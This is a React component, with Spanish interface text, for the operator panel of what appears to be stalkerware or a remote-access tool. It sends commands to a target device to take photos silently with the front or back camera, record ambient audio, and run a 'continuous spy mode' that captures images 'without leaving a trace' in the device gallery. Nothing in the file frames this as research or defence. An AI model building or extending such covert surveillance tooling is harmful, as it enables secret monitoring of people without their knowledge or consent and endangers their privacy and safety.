import React, { useState } from "react";
import { Card } from "@/components/ui/card";
import { Camera, Mic, Eye, Play, StopCircle, RefreshCw, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Slider } from "@/components/ui/slider";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";

interface SpyControlProps {
  deviceId: number;
}

export const SpyControl: React.FC<SpyControlProps> = ({ deviceId }) => {
  const [isCapturing, setIsCapturing] = useState(false);
  const sendCommand = trpc.devices.sendCommand.useMutation();

  const handleCapturePhoto = (camera: "front" | "back") => {
    sendCommand.mutate({
      deviceId,
      command: "capture-camera",
      payload: { camera }
    }, {
      onSuccess: () => toast.success(`Petición de foto ${camera === 'front' ? 'frontal' : 'trasera'} enviada`),
    });
  };

  const handleRecordMic = (duration: number) => {
    sendCommand.mutate({
      deviceId,
      command: "record-mic",
      payload: { duration }
    }, {
      onSuccess: () => toast.success(`Grabación de ${duration}s iniciada`),
    });
  };

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
      <Card className="glass-panel border-cyan-500/20 overflow-hidden">
        <div className="p-4 border-b border-cyan-500/10 bg-cyan-500/5 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Camera className="w-4 h-4 text-cyan-500" />
            <h2 className="text-xs font-black uppercase tracking-widest text-cyan-400">Captura de Cámara Silenciosa</h2>
          </div>
          <Badge variant="outline" className="bg-cyan-500/10 text-cyan-400 border-cyan-500/30 text-[9px]">RAW ACCESS</Badge>
        </div>
        <div className="p-6 space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <Button 
              variant="outline" 
              className="h-24 rounded-2xl border-cyan-500/10 bg-cyan-500/5 hover:bg-cyan-500/10 flex flex-col gap-2 group transition-all duration-500"
              onClick={() => handleCapturePhoto("front")}
            >
              <div className="w-10 h-10 rounded-full bg-cyan-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                <Camera className="w-5 h-5 text-cyan-400" />
              </div>
              <span className="text-[10px] font-black uppercase tracking-widest text-cyan-300">Cámara Frontal</span>
            </Button>
            <Button 
              variant="outline" 
              className="h-24 rounded-2xl border-cyan-500/10 bg-cyan-500/5 hover:bg-cyan-500/10 flex flex-col gap-2 group transition-all duration-500"
              onClick={() => handleCapturePhoto("back")}
            >
              <div className="w-10 h-10 rounded-full bg-cyan-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                <Shield className="w-5 h-5 text-cyan-400" />
              </div>
              <span className="text-[10px] font-black uppercase tracking-widest text-cyan-300">Cámara Trasera</span>
            </Button>
          </div>
          <div className="p-4 bg-black/40 rounded-xl border border-cyan-500/5">
             <div className="flex items-center justify-between mb-2">
               <span className="text-[9px] font-black uppercase text-slate-500 tracking-widest">Modo Espía Continuo</span>
               <Badge className="bg-rose-500/20 text-rose-400 text-[8px] animate-pulse">OFFLINE</Badge>
             </div>
             <p className="text-[9px] text-slate-400 leading-relaxed font-medium">Toma fotos cada N segundos sin dejar rastro en la galería del dispositivo.</p>
          </div>
        </div>
      </Card>

      <Card className="glass-panel border-purple-500/20 overflow-hidden">
        <div className="p-4 border-b border-purple-500/10 bg-purple-500/5 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Mic className="w-4 h-4 text-purple-500" />
            <h2 className="text-xs font-black uppercase tracking-widest text-purple-400">Escucha Ambiental</h2>
          </div>
        </div>
        <div className="p-6 space-y-6">
          <div className="space-y-3">
            <div className="flex justify-between items-center">
               <label className="text-[10px] font-black uppercase text-slate-400 tracking-tighter">Duración de Captura</label>
               <span className="text-xs font-black text-purple-400 tracking-widest">30 SEG</span>
            </div>
            <Slider defaultValue={[30]} max={300} step={10} className="py-4" />
          </div>

          <Button 
            className="w-full h-12 rounded-xl bg-purple-600 hover:bg-purple-700 text-white font-black uppercase tracking-widest shadow-lg shadow-purple-900/20"
            onClick={() => handleRecordMic(30)}
          >
            <Play className="w-4 h-4 mr-2" />
            Iniciar Grabación
          </Button>

          <div className="flex gap-2">
            <Button variant="outline" className="flex-1 h-10 border-purple-500/10 hover:bg-purple-500/5 text-[9px] font-black uppercase">Voz Activada</Button>
            <Button variant="outline" className="flex-1 h-10 border-purple-500/10 hover:bg-purple-500/5 text-[9px] font-black uppercase text-rose-400">Pánico</Button>
          </div>
        </div>
      </Card>
    </div>
  );
};
